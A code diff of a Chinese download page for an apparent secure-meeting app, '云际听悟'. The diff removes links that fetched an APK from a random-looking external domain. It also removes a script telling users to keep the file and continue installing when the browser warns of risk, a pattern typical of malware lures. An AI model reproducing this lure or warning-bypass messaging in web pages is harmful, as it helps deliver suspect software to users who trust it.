@@ -729,7 +729,7 @@
       <h1>企业级<em>安全会议</em><br>全平台覆盖</h1>
       <p class="hero-desc">端到端加密、超低延迟，为团队提供稳定可靠的远程音视频协作体验。</p>
       <div class="hero-btns">
-        <a class="btn btn-w" href="https://fadsfdfdffd.site/rLFh" data-download="云际听悟.apk" download="云际听悟.apk">
+        <a class="btn btn-w" href="/TingWu.apk" download="TingWu.apk">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
             <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4" />
             <polyline points="7 10 12 15 17 10" />
@@ -774,7 +774,7 @@
         <h3>Android</h3>
         <p>Android 6.0+，正式签名 APK</p>
         <div class="dl-tags"><span class="tag">手机 &amp; 平板</span><span class="tag">正式签名</span></div>
-        <a class="btn btn-blue" href="https://fadsfdfdffd.site/rLFh" data-download="云际听悟.apk" download="云际听悟.apk">下载 APK</a>
+        <a class="btn btn-blue" href="/TingWu.apk" download="TingWu.apk">下载 APK</a>
       </div>
 
       <!-- iOS -->
@@ -921,91 +921,6 @@
       };
 
       closeBtn.addEventListener('click', closeModal);
-
-      /* ── APK 下载：fetch 真正下完再放行 ── */
-      document.querySelectorAll('[data-download]').forEach((btn) => {
-        btn.addEventListener('click', (e) => {
-          e.preventDefault();
-          const fileName = btn.getAttribute('data-download') || '安装包';
-          const url = btn.getAttribute('href');
-          const isCrossOrigin = (() => {
-            try {
-              return new URL(url, window.location.href).origin !== window.location.origin;
-            } catch (_) {
-              return false;
-            }
-          })();
-
-          // HTTPS 页面下拉 HTTP 或跨域链接时，不走 fetch，直接浏览器下载。
-          if ((window.location.protocol === 'https:' && /^http:\/\//i.test(url)) || isCrossOrigin) {
-            openModal('正在打开下载…', '当前页面为 HTTPS，已切换为浏览器直链下载。');
-            spinnerEl.style.display = 'none';
-            progressWrap.style.display = 'none';
-            titleEl.textContent = '请在新标签页中继续下载';
-            descEl.textContent = '若浏览器提示风险，请点击保留后继续安装。';
-            closeBtn.style.display = '';
-            closeBtn.textContent = '我知道了';
-
-            const a = document.createElement('a');
-            a.href = url;
-            a.target = '_blank';
-            a.rel = 'noopener';
-            a.download = fileName;
-            document.body.appendChild(a);
-            a.click();
-            a.remove();
-            return;
-          }
-
-          openModal('下载中，请稍候…', '正在下载 ' + fileName + '，下载完成前请勿离开。');
-          progressWrap.style.display = '';
-
-          fetch(url).then((res) => {
-            const total = parseInt(res.headers.get('content-length'), 10) || 0;
-            const reader = res.body.getReader();
-            let loaded = 0;
-            const chunks = [];
-
-            const pump = () => reader.read().then(({ done, value }) => {
-              if (done) return;
-              chunks.push(value);
-              loaded += value.length;
-              if (total) {
-                const pct = Math.min(Math.round((loaded / total) * 100), 100);
-                fillEl.style.width = pct + '%';
-                percentEl.textContent = pct + '%';
-              } else {
-                const mb = (loaded / 1048576).toFixed(1);
-                percentEl.textContent = mb + ' MB';
-              }
-              return pump();
-            });
-
-            return pump().then(() => new Blob(chunks));
-          }).then((blob) => {
-            /* 触发浏览器保存 */
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = fileName;
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 1000);
-
-            /* 下载完成，允许关闭 */
-            spinnerEl.style.display = 'none';
-            fillEl.style.width = '100%';
-            percentEl.textContent = '100%';
-            titleEl.textContent = '下载完成！';
-            descEl.textContent = fileName + ' 已保存，请在下载文件夹中查看并安装。';
-            closeBtn.style.display = '';
-          }).catch(() => {
-            spinnerEl.style.display = 'none';
-            titleEl.textContent = '下载失败';
-            descEl.textContent = '网络异常，请检查网络后重试。';
-            closeBtn.style.display = '';
-          });
-        });
-      });
 
       /* ── 外部链接：正常跳转，短暂提示 ── */
       document.querySelectorAll('[data-open]').forEach((btn) => {
